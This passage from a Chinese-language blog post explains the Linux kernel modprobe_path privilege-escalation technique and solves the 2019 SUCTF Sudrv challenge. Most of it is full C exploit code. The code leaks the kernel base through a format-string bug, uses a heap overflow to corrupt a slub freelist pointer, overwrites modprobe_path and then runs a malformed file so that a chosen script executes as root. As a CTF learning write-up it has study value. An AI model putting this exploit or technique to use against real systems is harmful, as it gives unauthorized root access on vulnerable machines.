class="line">	retval = <span class="built_in">kernel_execve</span>(sub_info-&gt;path,</span><br><span class="line">			       (<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> *)sub_info-&gt;argv,</span><br><span class="line">			       (<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> *)sub_info-&gt;envp);</span><br><span class="line">out:</span><br><span class="line">	sub_info-&gt;retval = retval;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * call_usermodehelper_exec_sync() will call umh_complete</span></span><br><span class="line"><span class="comment">	 * if UHM_WAIT_PROC.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(sub_info-&gt;wait &amp; UMH_WAIT_PROC))</span><br><span class="line">		<span class="built_in">umh_complete</span>(sub_info);</span><br><span class="line">	<span class="keyword">if</span> (!retval)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">do_exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们回到<strong>search_binary_handler()</strong>函数看什么时候才会进入到<strong>request_module</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">retval = prepare_binprm(bprm);</span><br><span class="line">retval = security_bprm_check(bprm);</span><br></pre></td></tr></table></figure></div>
<ol type="1">
<li><strong>准备执行参数</strong>：读取可执行文件头信息，检查安全性等。</li>
<li><strong>遍历内核已注册的 binfmt handler
列表</strong>（<code>formats</code> 链表）：</li>
</ol>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">list_for_each_entry(fmt, &amp;formats, lh) &#123;</span><br><span class="line">	retval = fmt-&gt;load_binary(bprm);</span><br><span class="line">	<span class="keyword">if</span> (retval != -ENOEXEC)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>每一个 <code>fmt</code> 都是一个实现了 <code>.load_binary()</code> 的
<code>struct linux_binfmt</code>，比如：</p>
<ul>
<li><code>binfmt_elf</code>（处理 ELF）</li>
<li><code>binfmt_script</code>（处理以 <code>#!</code> 开头的脚本）</li>
<li><code>binfmt_misc</code>（可以配置处理 Java、Python、WINE、WSL
等）</li>
</ul>
<p>关键代码段如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (need_retry) &#123;</span><br><span class="line">	<span class="keyword">if</span> (printable(bprm-&gt;buf[<span class="number">0</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">1</span>]) &amp;&amp;</span><br><span class="line">	    printable(bprm-&gt;buf[<span class="number">2</span>]) &amp;&amp; printable(bprm-&gt;buf[<span class="number">3</span>]))</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request_module(<span class="string">&quot;binfmt-%04x&quot;</span>, *(ushort *)(bprm-&gt;buf + <span class="number">2</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	need_retry = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>条件解析如下：</p>
<ol type="1">
<li><strong>没有任何 handler 能处理这个文件时，才会尝试 retry：</strong>
<ul>
<li>只有在上面那轮遍历所有 <code>load_binary()</code> 都返回
<code>-ENOEXEC</code>，才会进入 retry。</li>
</ul></li>
<li><strong>request_module 的前置判断：</strong>
<ul>
<li><code>bprm-&gt;buf</code> 前四个字节都不是 ASCII 可打印字符 →
猜测是非标准格式（非 ELF、非脚本）</li>
<li>然后尝试 <code>request_module("binfmt-xxxx")</code>，比如触发
<code>binfmt_misc</code> 加载。</li>
</ul></li>
</ol>
<p>所以当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个
<code>modprobe_path</code>所指向的程序。如果我们将这个字符串指向我们自己的<code>sh</code>文件
，并使用 <code>system</code>或 <code>execve</code>
去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以以root权限执行我们自己的二进制文件了。</p>
<h4 id="例题分析">例题分析</h4>
<h5 id="suctf-sudrv"><strong>2019 SUCTF Sudrv</strong></h5>
<p>启动脚本如下，开了kaslr与smep。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-nographic 2&gt;/dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu kvm64,+smep </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>初始化脚本如下，其中我们可以用dmesg查看内核日志，printk也会有回显。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">mknod</span> -m 622 console c 5 1</span><br><span class="line"><span class="built_in">mknod</span> -m 622 tty0 c 4 0</span><br><span class="line">insmod sudrv.ko</span><br><span class="line"><span class="built_in">mknod</span> /dev/meizijiutql c 233 0</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/meizijiutql</span><br><span class="line">mdev -s</span><br><span class="line">sysctl kernel.dmesg_restrict=0 </span><br><span class="line"><span class="comment"># echo &quot;7 7 7 7&quot; &gt; /proc/sys/kernel/printk</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>漏洞模块首先注册了一个<strong>meizijiutql</strong>的字符设备，我们可以从<strong>/dev/meizijiutql</strong>进行访问与交互。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412114116661.png"
                      class=""
                >
<p>ioctl有三种功能，其中<strong>sudrv_ioctl_cold_2</strong>可以用<strong>printk</strong>打印出<strong>su_buf</strong>内容并返回。而且具体打印逻辑也存在格式化字符串漏洞。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412114341234.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412142354055.png"
                      class=""
                >
<p>write可以往全局变量su_buf中写入内容，没有限定长度，一个显然的堆溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412122056080.png"
                      class=""
                >
<p>那么我们可以首先先来用格式化字符串漏洞泄露地址看看：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_write</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] write to su_buf\n&quot;</span>);</span><br><span class="line">	write(fd,buf,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_malloc</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] kmalloc a chunk of size %d\n&quot;</span>,size);</span><br><span class="line">	ioctl(fd, <span class="number">0x73311337</span>, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_free</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] chunk freed\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0x13377331</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_printf</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] show content of the chunk\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0xDEADBEEF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/sh&#x27; &gt; /tmp/getshell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/ll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/meizijiutql&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*]open /dev/meizijiutql error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    dev_malloc(fd,<span class="number">0x50</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx&quot;</span>;</span><br><span class="line">    dev_write(fd,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    dev_printf(fd);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412154341228.png"
                      class=""
                >
<p>直接运行发现第6个地址是内核相关的地址，并且这个地址相对于内核符号基址的偏移是不变的，那么我们为了方便提取出这个地址，可以在前面加上一个标识符。将内核相关地址获取到某个变量中有两种方式，一种可以利用<strong>popen</strong>读取<strong>dmesg</strong>的输出，然后查找我们的需要的地址；或者也可以直接用<strong>scanf</strong>阻塞程序，让我们自己手动看到内核调试信息后将地址输入进去。这里我使用第一种方法时遇到一个问题，就是用<strong>dmesg</strong>命令直接读取日志时里面并不包含我们格式化字符串漏洞泄露的内容。解决方法是连着调用两次<strong>dev_printf</strong>，这是因为<strong><code>printk</code>
的输出在第一次调用时被缓存在日志缓冲区中，只有在之后有新的
<code>printk</code> 或相关事件触发时，日志才被刷新并能通过
<code>dmesg</code> 看到</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_write</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] write to su_buf\n&quot;</span>);</span><br><span class="line">	write(fd,buf,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_malloc</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] kmalloc a chunk of size %d\n&quot;</span>,size);</span><br><span class="line">	ioctl(fd, <span class="number">0x73311337</span>, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_free</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] chunk freed\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0x13377331</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_printf</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] show content of the chunk\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0xDEADBEEF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">get_kernel_leak</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp = popen(<span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        perror(<span class="string">&quot;popen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;kernel:&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">char</span> *ptr = <span class="built_in">strstr</span>(line, <span class="string">&quot;kernel:&quot;</span>);    <span class="comment">// 定位到kernel:提示符</span></span><br><span class="line">            <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find kernel leak! %s&quot;</span>,ptr+<span class="built_in">strlen</span>(<span class="string">&quot;kernel:&quot;</span>));</span><br><span class="line">                <span class="built_in">sscanf</span>(ptr + <span class="built_in">strlen</span>(<span class="string">&quot;kernel:&quot;</span>), <span class="string">&quot;%llx&quot;</span>, &amp;leak);  <span class="comment">// 泄露后面紧跟的地址</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="keyword">return</span> leak;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/sh&#x27; &gt; /tmp/getshell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/ll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/meizijiutql&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*]open /dev/meizijiutql error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    dev_malloc(fd,<span class="number">0x50</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;%llx-%llx-%llx-%llx-%llx-kernel:%llx&quot;</span>;</span><br><span class="line">    dev_write(fd,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    dev_printf(fd);</span><br><span class="line">    dev_printf(fd);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = get_kernel_leak();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = leak - <span class="number">0x1C827F</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel base: 0x%llx\n&quot;</span>, base);</span><br><span class="line">    dev_free(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412160600657.png"
                      class=""
                >
<p>有了<strong>kernel
base</strong>后，我们要去找<strong>modprobe_path</strong>的位置，这个符号本身不在<strong>/proc/kallsyms</strong>里，我们可以通过相对位置来找，比如先找引用了<strong>modprobe_path</strong>的**__request_module<strong>。因为</strong>modprobe_path<strong>一般默认值为</strong>/sbin/modprobe<strong>，我们也可以直接用gdb查找该字符串得到几个可能的</strong>modprobe_path**指向的位置，这几个地址都可写，我们也可以一个一个覆盖过来来爆破。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412163624854.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412163734369.png"
                      class=""
                >
<p>之后的利用思路就是依靠堆溢出，改一些free掉的chunk的fd位，然后就能分配chunk到我们想要的地址，实现任意地址写。比如我们申请一个0x400的堆块，然后看到有如下布局。后面紧跟着的就是下一个申请位置的<strong>fd</strong>域。这里主要涉及到<strong>slub</strong>堆分配器的原理，我们后面再进行详细学习，这里我们大概知道堆溢出劫持该fd域就能实现任意堆块分配就行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412173121764.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412174807439.png"
                      class=""
                >
<p>最后执行我们一开始创建的<strong>/tmp/exec</strong>文件即可触发root权限调用我们指向的可执行文件。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_write</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] write to su_buf\n&quot;</span>);</span><br><span class="line">	write(fd,buf,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_malloc</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] kmalloc a chunk of size %d\n&quot;</span>,size);</span><br><span class="line">	ioctl(fd, <span class="number">0x73311337</span>, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_free</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] chunk freed\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0x13377331</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dev_printf</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] show content of the chunk\n&quot;</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0xDEADBEEF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">get_kernel_leak</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp = popen(<span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        perror(<span class="string">&quot;popen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;kernel:&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">char</span> *ptr = <span class="built_in">strstr</span>(line, <span class="string">&quot;kernel:&quot;</span>);    <span class="comment">// 定位到kernel:提示符</span></span><br><span class="line">            <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find kernel leak! %s&quot;</span>,ptr+<span class="built_in">strlen</span>(<span class="string">&quot;kernel:&quot;</span>));</span><br><span class="line">                <span class="built_in">sscanf</span>(ptr + <span class="built_in">strlen</span>(<span class="string">&quot;kernel:&quot;</span>), <span class="string">&quot;%llx&quot;</span>, &amp;leak);  <span class="comment">// 泄露后面紧跟的地址</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="keyword">return</span> leak;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\ncat /flag &gt; /tmp/flag&#x27; &gt; /tmp/p&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/p&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/exec&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod a+x /tmp/exec&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/meizijiutql&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*]open /dev/meizijiutql error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    dev_malloc(fd,<span class="number">0x50</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>] = <span class="string">&quot;%llx-%llx-%llx-%llx-%llx-kernel:%llx&quot;</span>;</span><br><span class="line">    dev_write(fd,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    dev_printf(fd);</span><br><span class="line">    dev_printf(fd);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = get_kernel_leak();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = leak - <span class="number">0x1C827F</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Kernel base: 0x%llx\n&quot;</span>, base);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> modprobe_path = base + <span class="number">0x1242320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path: 0x%llx\n&quot;</span>, modprobe_path);</span><br><span class="line">    </span><br><span class="line">    dev_malloc(fd,<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf + <span class="built_in">strlen</span>(buf), &amp;modprobe_path, <span class="keyword">sizeof</span>(modprobe_path));</span><br><span class="line">    dev_write(fd,buf,<span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    dev_malloc(fd,<span class="number">0x400</span>);</span><br><span class="line">    dev_malloc(fd,<span class="number">0x400</span>);</span><br><span class="line">    dev_write(fd,<span class="string">&quot;/tmp/p&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/tmp/exec&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>为了观察exp是否生效，这里我们可以在init脚本加上这么一段，并自己设置一个flag本地测试。</p>
